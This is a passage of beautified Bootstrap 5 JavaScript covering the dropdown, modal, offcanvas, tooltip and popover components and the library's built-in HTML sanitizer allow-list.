                        enabled: !1
                    }]), {
                        ...t,
                        ..."function" == typeof this._config.popperConfig ? this._config.popperConfig(t) : this._config.popperConfig
                    }
                }
                _selectMenuItem({
                    key: e,
                    target: i
                }) {
                    const n = t.find(".dropdown-menu .dropdown-item:not(.disabled):not(:disabled)", this._menu).filter(c);
                    n.length && y(n, i, "ArrowDown" === e, !n.includes(i)).focus()
                }
                static dropdownInterface(t, e) {
                    const i = Ae.getOrCreateInstance(t, e);
                    if ("string" == typeof e) {
                        if (void 0 === i[e]) throw new TypeError(`No method named "${e}"`);
                        i[e]()
                    }
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        Ae.dropdownInterface(this, t)
                    }))
                }
                static clearMenus(e) {
                    if (e && (2 === e.button || "keyup" === e.type && "Tab" !== e.key)) return;
                    const i = t.find('[data-bs-toggle="dropdown"]');
                    for (let t = 0, n = i.length; t < n; t++) {
                        const n = Ae.getInstance(i[t]);
                        if (!n || !1 === n._config.autoClose) continue;
                        if (!n._element.classList.contains("show")) continue;
                        const s = {
                            relatedTarget: n._element
                        };
                        if (e) {
                            const t = e.composedPath(),
                                i = t.includes(n._menu);
                            if (t.includes(n._element) || "inside" === n._config.autoClose && !i || "outside" === n._config.autoClose && i) continue;
                            if (n._menu.contains(e.target) && ("keyup" === e.type && "Tab" === e.key || /input|select|option|textarea|form/i.test(e.target.tagName))) continue;
                            "click" === e.type && (s.clickEvent = e)
                        }
                        n._completeHide(s)
                    }
                }
                static getParentFromElement(t) {
                    return s(t) || t.parentNode
                }
                static dataApiKeydownHandler(e) {
                    if (/input|textarea/i.test(e.target.tagName) ? "Space" === e.key || "Escape" !== e.key && ("ArrowDown" !== e.key && "ArrowUp" !== e.key || e.target.closest(".dropdown-menu")) : !pe.test(e.key)) return;
                    const i = this.classList.contains("show");
                    if (!i && "Escape" === e.key) return;
                    if (e.preventDefault(), e.stopPropagation(), h(this)) return;
                    const n = () => this.matches('[data-bs-toggle="dropdown"]') ? this : t.prev(this, '[data-bs-toggle="dropdown"]')[0];
                    return "Escape" === e.key ? (n().focus(), void Ae.clearMenus()) : "ArrowUp" === e.key || "ArrowDown" === e.key ? (i || n().click(), void Ae.getInstance(n())._selectMenuItem(e)) : void (i && "Space" !== e.key || Ae.clearMenus())
                }
            }
            P.on(document, "keydown.bs.dropdown.data-api", '[data-bs-toggle="dropdown"]', Ae.dataApiKeydownHandler), P.on(document, "keydown.bs.dropdown.data-api", ".dropdown-menu", Ae.dataApiKeydownHandler), P.on(document, "click.bs.dropdown.data-api", Ae.clearMenus), P.on(document, "keyup.bs.dropdown.data-api", Ae.clearMenus), P.on(document, "click.bs.dropdown.data-api", '[data-bs-toggle="dropdown"]', (function (t) {
                t.preventDefault(), Ae.dropdownInterface(this)
            })), _(Ae);
            class Te {
                constructor() {
                    this._element = document.body
                }
                getWidth() {
                    const t = document.documentElement.clientWidth;
                    return Math.abs(window.innerWidth - t)
                }
                hide() {
                    const t = this.getWidth();
                    this._disableOverFlow(), this._setElementAttributes(this._element, "paddingRight", e => e + t), this._setElementAttributes(".fixed-top, .fixed-bottom, .is-fixed, .sticky-top", "paddingRight", e => e + t), this._setElementAttributes(".sticky-top", "marginRight", e => e - t)
                }
                _disableOverFlow() {
                    this._saveInitialAttribute(this._element, "overflow"), this._element.style.overflow = "hidden"
                }
                _setElementAttributes(t, e, i) {
                    const n = this.getWidth();
                    this._applyManipulationCallback(t, t => {
                        if (t !== this._element && window.innerWidth > t.clientWidth + n) return;
                        this._saveInitialAttribute(t, e);
                        const s = window.getComputedStyle(t)[e];
                        t.style[e] = i(Number.parseFloat(s)) + "px"
                    })
                }
                reset() {
                    this._resetElementAttributes(this._element, "overflow"), this._resetElementAttributes(this._element, "paddingRight"), this._resetElementAttributes(".fixed-top, .fixed-bottom, .is-fixed, .sticky-top", "paddingRight"), this._resetElementAttributes(".sticky-top", "marginRight")
                }
                _saveInitialAttribute(t, e) {
                    const i = t.style[e];
                    i && U.setDataAttribute(t, e, i)
                }
                _resetElementAttributes(t, e) {
                    this._applyManipulationCallback(t, t => {
                        const i = U.getDataAttribute(t, e);
                        void 0 === i ? t.style.removeProperty(e) : (U.removeDataAttribute(t, e), t.style[e] = i)
                    })
                }
                _applyManipulationCallback(e, i) {
                    r(e) ? i(e) : t.find(e, this._element).forEach(i)
                }
                isOverflowing() {
                    return this.getWidth() > 0
                }
            }
            const Oe = {
                isVisible: !0,
                isAnimated: !1,
                rootElement: "body",
                clickCallback: null
            },
                Ce = {
                    isVisible: "boolean",
                    isAnimated: "boolean",
                    rootElement: "(element|string)",
                    clickCallback: "(function|null)"
                };
            class ke {
                constructor(t) {
                    this._config = this._getConfig(t), this._isAppended = !1, this._element = null
                }
                show(t) {
                    this._config.isVisible ? (this._append(), this._config.isAnimated && f(this._getElement()), this._getElement().classList.add("show"), this._emulateAnimation(() => {
                        b(t)
                    })) : b(t)
                }
                hide(t) {
                    this._config.isVisible ? (this._getElement().classList.remove("show"), this._emulateAnimation(() => {
                        this.dispose(), b(t)
                    })) : b(t)
                }
                _getElement() {
                    if (!this._element) {
                        const t = document.createElement("div");
                        t.className = "modal-backdrop", this._config.isAnimated && t.classList.add("fade"), this._element = t
                    }
                    return this._element
                }
                _getConfig(t) {
                    return (t = {
                        ...Oe,
                        ..."object" == typeof t ? t : {}
                    }).rootElement = a(t.rootElement), l("backdrop", t, Ce), t
                }
                _append() {
                    this._isAppended || (this._config.rootElement.appendChild(this._getElement()), P.on(this._getElement(), "mousedown.bs.backdrop", () => {
                        b(this._config.clickCallback)
                    }), this._isAppended = !0)
                }
                dispose() {
                    this._isAppended && (P.off(this._element, "mousedown.bs.backdrop"), this._element.remove(), this._isAppended = !1)
                }
                _emulateAnimation(t) {
                    v(t, this._getElement(), this._config.isAnimated)
                }
            }
            const Le = {
                backdrop: !0,
                keyboard: !0,
                focus: !0
            },
                xe = {
                    backdrop: "(boolean|string)",
                    keyboard: "boolean",
                    focus: "boolean"
                };
            class De extends B {
                constructor(e, i) {
                    super(e), this._config = this._getConfig(i), this._dialog = t.findOne(".modal-dialog", this._element), this._backdrop = this._initializeBackDrop(), this._isShown = !1, this._ignoreBackdropClick = !1, this._isTransitioning = !1, this._scrollBar = new Te
                }
                static get Default() {
                    return Le
                }
                static get NAME() {
                    return "modal"
                }
                toggle(t) {
                    return this._isShown ? this.hide() : this.show(t)
                }
                show(t) {
                    this._isShown || this._isTransitioning || P.trigger(this._element, "show.bs.modal", {
                        relatedTarget: t
                    }).defaultPrevented || (this._isShown = !0, this._isAnimated() && (this._isTransitioning = !0), this._scrollBar.hide(), document.body.classList.add("modal-open"), this._adjustDialog(), this._setEscapeEvent(), this._setResizeEvent(), P.on(this._element, "click.dismiss.bs.modal", '[data-bs-dismiss="modal"]', t => this.hide(t)), P.on(this._dialog, "mousedown.dismiss.bs.modal", () => {
                        P.one(this._element, "mouseup.dismiss.bs.modal", t => {
                            t.target === this._element && (this._ignoreBackdropClick = !0)
                        })
                    }), this._showBackdrop(() => this._showElement(t)))
                }
                hide(t) {
                    if (t && ["A", "AREA"].includes(t.target.tagName) && t.preventDefault(), !this._isShown || this._isTransitioning) return;
                    if (P.trigger(this._element, "hide.bs.modal").defaultPrevented) return;
                    this._isShown = !1;
                    const e = this._isAnimated();
                    e && (this._isTransitioning = !0), this._setEscapeEvent(), this._setResizeEvent(), P.off(document, "focusin.bs.modal"), this._element.classList.remove("show"), P.off(this._element, "click.dismiss.bs.modal"), P.off(this._dialog, "mousedown.dismiss.bs.modal"), this._queueCallback(() => this._hideModal(), this._element, e)
                }
                dispose() {
                    [window, this._dialog].forEach(t => P.off(t, ".bs.modal")), this._backdrop.dispose(), super.dispose(), P.off(document, "focusin.bs.modal")
                }
                handleUpdate() {
                    this._adjustDialog()
                }
                _initializeBackDrop() {
                    return new ke({
                        isVisible: Boolean(this._config.backdrop),
                        isAnimated: this._isAnimated()
                    })
                }
                _getConfig(t) {
                    return t = {
                        ...Le,
                        ...U.getDataAttributes(this._element),
                        ..."object" == typeof t ? t : {}
                    }, l("modal", t, xe), t
                }
                _showElement(e) {
                    const i = this._isAnimated(),
                        n = t.findOne(".modal-body", this._dialog);
                    this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE || document.body.appendChild(this._element), this._element.style.display = "block", this._element.removeAttribute("aria-hidden"), this._element.setAttribute("aria-modal", !0), this._element.setAttribute("role", "dialog"), this._element.scrollTop = 0, n && (n.scrollTop = 0), i && f(this._element), this._element.classList.add("show"), this._config.focus && this._enforceFocus(), this._queueCallback(() => {
                        this._config.focus && this._element.focus(), this._isTransitioning = !1, P.trigger(this._element, "shown.bs.modal", {
                            relatedTarget: e
                        })
                    }, this._dialog, i)
                }
                _enforceFocus() {
                    P.off(document, "focusin.bs.modal"), P.on(document, "focusin.bs.modal", t => {
                        document === t.target || this._element === t.target || this._element.contains(t.target) || this._element.focus()
                    })
                }
                _setEscapeEvent() {
                    this._isShown ? P.on(this._element, "keydown.dismiss.bs.modal", t => {
                        this._config.keyboard && "Escape" === t.key ? (t.preventDefault(), this.hide()) : this._config.keyboard || "Escape" !== t.key || this._triggerBackdropTransition()
                    }) : P.off(this._element, "keydown.dismiss.bs.modal")
                }
                _setResizeEvent() {
                    this._isShown ? P.on(window, "resize.bs.modal", () => this._adjustDialog()) : P.off(window, "resize.bs.modal")
                }
                _hideModal() {
                    this._element.style.display = "none", this._element.setAttribute("aria-hidden", !0), this._element.removeAttribute("aria-modal"), this._element.removeAttribute("role"), this._isTransitioning = !1, this._backdrop.hide(() => {
                        document.body.classList.remove("modal-open"), this._resetAdjustments(), this._scrollBar.reset(), P.trigger(this._element, "hidden.bs.modal")
                    })
                }
                _showBackdrop(t) {
                    P.on(this._element, "click.dismiss.bs.modal", t => {
                        this._ignoreBackdropClick ? this._ignoreBackdropClick = !1 : t.target === t.currentTarget && (!0 === this._config.backdrop ? this.hide() : "static" === this._config.backdrop && this._triggerBackdropTransition())
                    }), this._backdrop.show(t)
                }
                _isAnimated() {
                    return this._element.classList.contains("fade")
                }
                _triggerBackdropTransition() {
                    if (P.trigger(this._element, "hidePrevented.bs.modal").defaultPrevented) return;
                    const {
                        classList: t,
                        scrollHeight: e,
                        style: i
                    } = this._element, n = e > document.documentElement.clientHeight;
                    !n && "hidden" === i.overflowY || t.contains("modal-static") || (n || (i.overflowY = "hidden"), t.add("modal-static"), this._queueCallback(() => {
                        t.remove("modal-static"), n || this._queueCallback(() => {
                            i.overflowY = ""
                        }, this._dialog)
                    }, this._dialog), this._element.focus())
                }
                _adjustDialog() {
                    const t = this._element.scrollHeight > document.documentElement.clientHeight,
                        e = this._scrollBar.getWidth(),
                        i = e > 0;
                    (!i && t && !g() || i && !t && g()) && (this._element.style.paddingLeft = e + "px"), (i && !t && !g() || !i && t && g()) && (this._element.style.paddingRight = e + "px")
                }
                _resetAdjustments() {
                    this._element.style.paddingLeft = "", this._element.style.paddingRight = ""
                }
                static jQueryInterface(t, e) {
                    return this.each((function () {
                        const i = De.getOrCreateInstance(this, t);
                        if ("string" == typeof t) {
                            if (void 0 === i[t]) throw new TypeError(`No method named "${t}"`);
                            i[t](e)
                        }
                    }))
                }
            }
            P.on(document, "click.bs.modal.data-api", '[data-bs-toggle="modal"]', (function (t) {
                const e = s(this);
                ["A", "AREA"].includes(this.tagName) && t.preventDefault(), P.one(e, "show.bs.modal", t => {
                    t.defaultPrevented || P.one(e, "hidden.bs.modal", () => {
                        c(this) && this.focus()
                    })
                }), De.getOrCreateInstance(e).toggle(this)
            })), _(De);
            const Se = {
                backdrop: !0,
                keyboard: !0,
                scroll: !1
            },
                Ie = {
                    backdrop: "boolean",
                    keyboard: "boolean",
                    scroll: "boolean"
                };
            class Ne extends B {
                constructor(t, e) {
                    super(t), this._config = this._getConfig(e), this._isShown = !1, this._backdrop = this._initializeBackDrop(), this._addEventListeners()
                }
                static get NAME() {
                    return "offcanvas"
                }
                static get Default() {
                    return Se
                }
                toggle(t) {
                    return this._isShown ? this.hide() : this.show(t)
                }
                show(t) {
                    this._isShown || P.trigger(this._element, "show.bs.offcanvas", {
                        relatedTarget: t
                    }).defaultPrevented || (this._isShown = !0, this._element.style.visibility = "visible", this._backdrop.show(), this._config.scroll || ((new Te).hide(), this._enforceFocusOnElement(this._element)), this._element.removeAttribute("aria-hidden"), this._element.setAttribute("aria-modal", !0), this._element.setAttribute("role", "dialog"), this._element.classList.add("show"), this._queueCallback(() => {
                        P.trigger(this._element, "shown.bs.offcanvas", {
                            relatedTarget: t
                        })
                    }, this._element, !0))
                }
                hide() {
                    this._isShown && (P.trigger(this._element, "hide.bs.offcanvas").defaultPrevented || (P.off(document, "focusin.bs.offcanvas"), this._element.blur(), this._isShown = !1, this._element.classList.remove("show"), this._backdrop.hide(), this._queueCallback(() => {
                        this._element.setAttribute("aria-hidden", !0), this._element.removeAttribute("aria-modal"), this._element.removeAttribute("role"), this._element.style.visibility = "hidden", this._config.scroll || (new Te).reset(), P.trigger(this._element, "hidden.bs.offcanvas")
                    }, this._element, !0)))
                }
                dispose() {
                    this._backdrop.dispose(), super.dispose(), P.off(document, "focusin.bs.offcanvas")
                }
                _getConfig(t) {
                    return t = {
                        ...Se,
                        ...U.getDataAttributes(this._element),
                        ..."object" == typeof t ? t : {}
                    }, l("offcanvas", t, Ie), t
                }
                _initializeBackDrop() {
                    return new ke({
                        isVisible: this._config.backdrop,
                        isAnimated: !0,
                        rootElement: this._element.parentNode,
                        clickCallback: () => this.hide()
                    })
                }
                _enforceFocusOnElement(t) {
                    P.off(document, "focusin.bs.offcanvas"), P.on(document, "focusin.bs.offcanvas", e => {
                        document === e.target || t === e.target || t.contains(e.target) || t.focus()
                    }), t.focus()
                }
                _addEventListeners() {
                    P.on(this._element, "click.dismiss.bs.offcanvas", '[data-bs-dismiss="offcanvas"]', () => this.hide()), P.on(this._element, "keydown.dismiss.bs.offcanvas", t => {
                        this._config.keyboard && "Escape" === t.key && this.hide()
                    })
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        const e = Ne.getOrCreateInstance(this, t);
                        if ("string" == typeof t) {
                            if (void 0 === e[t] || t.startsWith("_") || "constructor" === t) throw new TypeError(`No method named "${t}"`);
                            e[t](this)
                        }
                    }))
                }
            }
            P.on(document, "click.bs.offcanvas.data-api", '[data-bs-toggle="offcanvas"]', (function (e) {
                const i = s(this);
                if (["A", "AREA"].includes(this.tagName) && e.preventDefault(), h(this)) return;
                P.one(i, "hidden.bs.offcanvas", () => {
                    c(this) && this.focus()
                });
                const n = t.findOne(".offcanvas.show");
                n && n !== i && Ne.getInstance(n).hide(), Ne.getOrCreateInstance(i).toggle(this)
            })), P.on(window, "load.bs.offcanvas.data-api", () => t.find(".offcanvas.show").forEach(t => Ne.getOrCreateInstance(t).show())), _(Ne);
            const je = new Set(["background", "cite", "href", "itemtype", "longdesc", "poster", "src", "xlink:href"]),
                Me = /^(?:(?:https?|mailto|ftp|tel|file):|[^#&/:?]*(?:[#/?]|$))/i,
                Pe = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[\d+/a-z]+=*$/i,
                He = (t, e) => {
                    const i = t.nodeName.toLowerCase();
                    if (e.includes(i)) return !je.has(i) || Boolean(Me.test(t.nodeValue) || Pe.test(t.nodeValue));
                    const n = e.filter(t => t instanceof RegExp);
                    for (let t = 0, e = n.length; t < e; t++)
                        if (n[t].test(i)) return !0;
                    return !1
                };
            function Re(t, e, i) {
                if (!t.length) return t;
                if (i && "function" == typeof i) return i(t);
                const n = (new window.DOMParser).parseFromString(t, "text/html"),
                    s = Object.keys(e),
                    o = [].concat(...n.body.querySelectorAll("*"));
                for (let t = 0, i = o.length; t < i; t++) {
                    const i = o[t],
                        n = i.nodeName.toLowerCase();
                    if (!s.includes(n)) {
                        i.remove();
                        continue
                    }
                    const r = [].concat(...i.attributes),
                        a = [].concat(e["*"] || [], e[n] || []);
                    r.forEach(t => {
                        He(t, a) || i.removeAttribute(t.nodeName)
                    })
                }
                return n.body.innerHTML
            }
            const Be = new RegExp("(^|\\s)bs-tooltip\\S+", "g"),
                We = new Set(["sanitize", "allowList", "sanitizeFn"]),
                qe = {
                    animation: "boolean",
                    template: "string",
                    title: "(string|element|function)",
                    trigger: "string",
                    delay: "(number|object)",
                    html: "boolean",
                    selector: "(string|boolean)",
                    placement: "(string|function)",
                    offset: "(array|string|function)",
                    container: "(string|element|boolean)",
                    fallbackPlacements: "array",
                    boundary: "(string|element)",
                    customClass: "(string|function)",
                    sanitize: "boolean",
                    sanitizeFn: "(null|function)",
                    allowList: "object",
                    popperConfig: "(null|object|function)"
                },
                ze = {
                    AUTO: "auto",
                    TOP: "top",
                    RIGHT: g() ? "left" : "right",
                    BOTTOM: "bottom",
                    LEFT: g() ? "right" : "left"
                },
                $e = {
                    animation: !0,
                    template: '<div class="tooltip" role="tooltip"><div class="tooltip-arrow"></div><div class="tooltip-inner"></div></div>',
                    trigger: "hover focus",
                    title: "",
                    delay: 0,
                    html: !1,
                    selector: !1,
                    placement: "top",
                    offset: [0, 0],
                    container: !1,
                    fallbackPlacements: ["top", "right", "bottom", "left"],
                    boundary: "clippingParents",
                    customClass: "",
                    sanitize: !0,
                    sanitizeFn: null,
                    allowList: {
                        "*": ["class", "dir", "id", "lang", "role", /^aria-[\w-]*$/i],
                        a: ["target", "href", "title", "rel"],
                        area: [],
                        b: [],
                        br: [],
                        col: [],
                        code: [],
                        div: [],
                        em: [],
                        hr: [],
                        h1: [],
                        h2: [],
                        h3: [],
                        h4: [],
                        h5: [],
                        h6: [],
                        i: [],
                        img: ["src", "srcset", "alt", "title", "width", "height"],
                        li: [],
                        ol: [],
                        p: [],
                        pre: [],
                        s: [],
                        small: [],
                        span: [],
                        sub: [],
                        sup: [],
                        strong: [],
                        u: [],
                        ul: []
                    },
                    popperConfig: null
                },
                Ue = {
                    HIDE: "hide.bs.tooltip",
                    HIDDEN: "hidden.bs.tooltip",
                    SHOW: "show.bs.tooltip",
                    SHOWN: "shown.bs.tooltip",
                    INSERTED: "inserted.bs.tooltip",
                    CLICK: "click.bs.tooltip",
                    FOCUSIN: "focusin.bs.tooltip",
                    FOCUSOUT: "focusout.bs.tooltip",
                    MOUSEENTER: "mouseenter.bs.tooltip",
                    MOUSELEAVE: "mouseleave.bs.tooltip"
                };
            class Fe extends B {
                constructor(t, e) {
                    if (void 0 === fe) throw new TypeError("Bootstrap's tooltips require Popper (https://popper.js.org)");
                    super(t), this._isEnabled = !0, this._timeout = 0, this._hoverState = "", this._activeTrigger = {}, this._popper = null, this._config = this._getConfig(e), this.tip = null, this._setListeners()
                }
                static get Default() {
                    return $e
                }
                static get NAME() {
                    return "tooltip"
                }
                static get Event() {
                    return Ue
                }
                static get DefaultType() {
                    return qe
                }
                enable() {
                    this._isEnabled = !0
                }
                disable() {
                    this._isEnabled = !1
                }
                toggleEnabled() {
                    this._isEnabled = !this._isEnabled
                }
                toggle(t) {
                    if (this._isEnabled)
                        if (t) {
                            const e = this._initializeOnDelegatedTarget(t);
                            e._activeTrigger.click = !e._activeTrigger.click, e._isWithActiveTrigger() ? e._enter(null, e) : e._leave(null, e)
                        } else {
                            if (this.getTipElement().classList.contains("show")) return void this._leave(null, this);
                            this._enter(null, this)
                        }
                }
                dispose() {
                    clearTimeout(this._timeout), P.off(this._element.closest(".modal"), "hide.bs.modal", this._hideModalHandler), this.tip && this.tip.remove(), this._popper && this._popper.destroy(), super.dispose()
                }
                show() {
                    if ("none" === this._element.style.display) throw new Error("Please use show on visible elements");
                    if (!this.isWithContent() || !this._isEnabled) return;
                    const t = P.trigger(this._element, this.constructor.Event.SHOW),
                        i = d(this._element),
                        n = null === i ? this._element.ownerDocument.documentElement.contains(this._element) : i.contains(this._element);
                    if (t.defaultPrevented || !n) return;
                    const s = this.getTipElement(),
                        o = e(this.constructor.NAME);
                    s.setAttribute("id", o), this._element.setAttribute("aria-describedby", o), this.setContent(), this._config.animation && s.classList.add("fade");
                    const r = "function" == typeof this._config.placement ? this._config.placement.call(this, s, this._element) : this._config.placement,
                        a = this._getAttachment(r);
                    this._addAttachmentClass(a);
                    const {
                        container: l
                    } = this._config;
                    R.set(s, this.constructor.DATA_KEY, this), this._element.ownerDocument.documentElement.contains(this.tip) || (l.appendChild(s), P.trigger(this._element, this.constructor.Event.INSERTED)), this._popper ? this._popper.update() : this._popper = ue(this._element, s, this._getPopperConfig(a)), s.classList.add("show");
                    const c = "function" == typeof this._config.customClass ? this._config.customClass() : this._config.customClass;
                    c && s.classList.add(...c.split(" ")), "ontouchstart" in document.documentElement && [].concat(...document.body.children).forEach(t => {
                        P.on(t, "mouseover", u)
                    });
                    const h = this.tip.classList.contains("fade");
                    this._queueCallback(() => {
                        const t = this._hoverState;
                        this._hoverState = null, P.trigger(this._element, this.constructor.Event.SHOWN), "out" === t && this._leave(null, this)
                    }, this.tip, h)
                }
                hide() {
                    if (!this._popper) return;
                    const t = this.getTipElement();
                    if (P.trigger(this._element, this.constructor.Event.HIDE).defaultPrevented) return;
                    t.classList.remove("show"), "ontouchstart" in document.documentElement && [].concat(...document.body.children).forEach(t => P.off(t, "mouseover", u)), this._activeTrigger.click = !1, this._activeTrigger.focus = !1, this._activeTrigger.hover = !1;
                    const e = this.tip.classList.contains("fade");
                    this._queueCallback(() => {
                        this._isWithActiveTrigger() || ("show" !== this._hoverState && t.remove(), this._cleanTipClass(), this._element.removeAttribute("aria-describedby"), P.trigger(this._element, this.constructor.Event.HIDDEN), this._popper && (this._popper.destroy(), this._popper = null))
                    }, this.tip, e), this._hoverState = ""
                }
                update() {
                    null !== this._popper && this._popper.update()
                }
                isWithContent() {
                    return Boolean(this.getTitle())
                }
                getTipElement() {
                    if (this.tip) return this.tip;
                    const t = document.createElement("div");
                    return t.innerHTML = this._config.template, this.tip = t.children[0], this.tip
                }
                setContent() {
                    const e = this.getTipElement();
                    this.setElementContent(t.findOne(".tooltip-inner", e), this.getTitle()), e.classList.remove("fade", "show")
                }
                setElementContent(t, e) {
                    if (null !== t) return r(e) ? (e = a(e), void (this._config.html ? e.parentNode !== t && (t.innerHTML = "", t.appendChild(e)) : t.textContent = e.textContent)) : void (this._config.html ? (this._config.sanitize && (e = Re(e, this._config.allowList, this._config.sanitizeFn)), t.innerHTML = e) : t.textContent = e)
                }
                getTitle() {
                    let t = this._element.getAttribute("data-bs-original-title");
                    return t || (t = "function" == typeof this._config.title ? this._config.title.call(this._element) : this._config.title), t
                }
                updateAttachment(t) {
                    return "right" === t ? "end" : "left" === t ? "start" : t
                }
                _initializeOnDelegatedTarget(t, e) {
                    const i = this.constructor.DATA_KEY;
                    return (e = e || R.get(t.delegateTarget, i)) || (e = new this.constructor(t.delegateTarget, this._getDelegateConfig()), R.set(t.delegateTarget, i, e)), e
                }
                _getOffset() {
                    const {
                        offset: t
                    } = this._config;
                    return "string" == typeof t ? t.split(",").map(t => Number.parseInt(t, 10)) : "function" == typeof t ? e => t(e, this._element) : t
                }
                _getPopperConfig(t) {
                    const e = {
                        placement: t,
                        modifiers: [{
                            name: "flip",
                            options: {
                                fallbackPlacements: this._config.fallbackPlacements
                            }
                        }, {
                            name: "offset",
                            options: {
                                offset: this._getOffset()
                            }
                        }, {
                            name: "preventOverflow",
                            options: {
                                boundary: this._config.boundary
                            }
                        }, {
                            name: "arrow",
                            options: {
                                element: `.${this.constructor.NAME}-arrow`
                            }
                        }, {
                            name: "onChange",
                            enabled: !0,
                            phase: "afterWrite",
                            fn: t => this._handlePopperPlacementChange(t)
                        }],
                        onFirstUpdate: t => {
                            t.options.placement !== t.placement && this._handlePopperPlacementChange(t)
                        }
                    };
                    return {
                        ...e,
                        ..."function" == typeof this._config.popperConfig ? this._config.popperConfig(e) : this._config.popperConfig
                    }
                }
                _addAttachmentClass(t) {
                    this.getTipElement().classList.add("bs-tooltip-" + this.updateAttachment(t))
                }
                _getAttachment(t) {
                    return ze[t.toUpperCase()]
                }
                _setListeners() {
                    this._config.trigger.split(" ").forEach(t => {
                        if ("click" === t) P.on(this._element, this.constructor.Event.CLICK, this._config.selector, t => this.toggle(t));
                        else if ("manual" !== t) {
                            const e = "hover" === t ? this.constructor.Event.MOUSEENTER : this.constructor.Event.FOCUSIN,
                                i = "hover" === t ? this.constructor.Event.MOUSELEAVE : this.constructor.Event.FOCUSOUT;
                            P.on(this._element, e, this._config.selector, t => this._enter(t)), P.on(this._element, i, this._config.selector, t => this._leave(t))
                        }
                    }), this._hideModalHandler = () => {
                        this._element && this.hide()
                    }, P.on(this._element.closest(".modal"), "hide.bs.modal", this._hideModalHandler), this._config.selector ? this._config = {
                        ...this._config,
                        trigger: "manual",
                        selector: ""
                    } : this._fixTitle()
                }
                _fixTitle() {
                    const t = this._element.getAttribute("title"),
                        e = typeof this._element.getAttribute("data-bs-original-title");
                    (t || "string" !== e) && (this._element.setAttribute("data-bs-original-title", t || ""), !t || this._element.getAttribute("aria-label") || this._element.textContent || this._element.setAttribute("aria-label", t), this._element.setAttribute("title", ""))
                }
                _enter(t, e) {
                    e = this._initializeOnDelegatedTarget(t, e), t && (e._activeTrigger["focusin" === t.type ? "focus" : "hover"] = !0), e.getTipElement().classList.contains("show") || "show" === e._hoverState ? e._hoverState = "show" : (clearTimeout(e._timeout), e._hoverState = "show", e._config.delay && e._config.delay.show ? e._timeout = setTimeout(() => {
                        "show" === e._hoverState && e.show()
                    }, e._config.delay.show) : e.show())
                }
                _leave(t, e) {
                    e = this._initializeOnDelegatedTarget(t, e), t && (e._activeTrigger["focusout" === t.type ? "focus" : "hover"] = e._element.contains(t.relatedTarget)), e._isWithActiveTrigger() || (clearTimeout(e._timeout), e._hoverState = "out", e._config.delay && e._config.delay.hide ? e._timeout = setTimeout(() => {
                        "out" === e._hoverState && e.hide()
                    }, e._config.delay.hide) : e.hide())
                }
                _isWithActiveTrigger() {
                    for (const t in this._activeTrigger)
                        if (this._activeTrigger[t]) return !0;
                    return !1
                }
                _getConfig(t) {
                    const e = U.getDataAttributes(this._element);
                    return Object.keys(e).forEach(t => {
                        We.has(t) && delete e[t]
                    }), (t = {
                        ...this.constructor.Default,
                        ...e,
                        ..."object" == typeof t && t ? t : {}
                    }).container = !1 === t.container ? document.body : a(t.container), "number" == typeof t.delay && (t.delay = {
                        show: t.delay,
                        hide: t.delay
                    }), "number" == typeof t.title && (t.title = t.title.toString()), "number" == typeof t.content && (t.content = t.content.toString()), l("tooltip", t, this.constructor.DefaultType), t.sanitize && (t.template = Re(t.template, t.allowList, t.sanitizeFn)), t
                }
                _getDelegateConfig() {
                    const t = {};
                    if (this._config)
                        for (const e in this._config) this.constructor.Default[e] !== this._config[e] && (t[e] = this._config[e]);
                    return t
                }
                _cleanTipClass() {
                    const t = this.getTipElement(),
                        e = t.getAttribute("class").match(Be);
                    null !== e && e.length > 0 && e.map(t => t.trim()).forEach(e => t.classList.remove(e))
                }
                _handlePopperPlacementChange(t) {
                    const {
                        state: e
                    } = t;
                    e && (this.tip = e.elements.popper, this._cleanTipClass(), this._addAttachmentClass(this._getAttachment(e.placement)))
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        const e = Fe.getOrCreateInstance(this, t);
                        if ("string" == typeof t) {
                            if (void 0 === e[t]) throw new TypeError(`No method named "${t}"`);
                            e[t]()
                        }
                    }))
                }
            }
            _(Fe);
            const Ve = new RegExp("(^|\\s)bs-popover\\S+", "g"),
                Ke = {
                    ...Fe.Default,
                    placement: "right",
                    offset: [0, 8],
                    trigger: "click",
                    content: "",
                    template: '<div class="popover" role="tooltip"><div class="popover-arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>'
                },
                Xe = {
                    ...Fe.DefaultType,
                    content: "(string|element|function)"
                },
                Ye = {
                    HIDE: "hide.bs.popover",
                    HIDDEN: "hidden.bs.popover",
                    SHOW: "show.bs.popover",
                    SHOWN: "shown.bs.popover",
                    INSERTED: "inserted.bs.popover",
                    CLICK: "click.bs.popover",
                    FOCUSIN: "focusin.bs.popover",
                    FOCUSOUT: "focusout.bs.popover",
                    MOUSEENTER: "mouseenter.bs.popover",
                    MOUSELEAVE: "mouseleave.bs.popover"
                };
            class Qe extends Fe {
                static get Default() {
                    return Ke
                }
                static get NAME() {
                    return "popover"
                }
                static get Event() {
                    return Ye
                }
                static get DefaultType() {
                    return Xe
                }
                isWithContent() {
                    return this.getTitle() || this._getContent()
                }
                getTipElement() {
                    return this.tip || (this.tip = super.getTipElement(), this.getTitle() || t.findOne(".popover-header", this.tip).remove(), this._getContent() || t.findOne(".popover-body", this.tip).remove()), this.tip
                }
                setContent() {
                    const e = this.getTipElement();
                    this.setElementContent(t.findOne(".popover-header", e), this.getTitle());
                    let i = this._getContent();
                    "function" == typeof i && (i = i.call(this._element)), this.setElementContent(t.findOne(".popover-body", e), i), e.classList.remove("fade", "show")
                }
                _addAttachmentClass(t) {
                    this.getTipElement().classList.add("bs-popover-" + this.updateAttachment(t))
                }
                _getContent() {
                    return this._element.getAttribute("data-bs-content") || this._config.content
                }
                _cleanTipClass() {
                    const t = this.getTipElement(),
                        e = t.getAttribute("class").match(Ve);
                    null !== e && e.length > 0 && e.map(t => t.trim()).forEach(e => t.classList.remove(e))
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        const e = Qe.getOrCreateInstance(this, t);
                        if ("string" == typeof t) {
                            if (void 0 === e[t]) throw new TypeError(`No method named "${t}"`);
                            e[t]()
                        }
                    }))
                }
            }
            _(Qe);
            const Ge = {
                offset: 10,
                method: "auto",
                target: ""
            },
                Ze = {
                    offset: "number",
                    method: "string",
                    target: "(string|element)"
                };
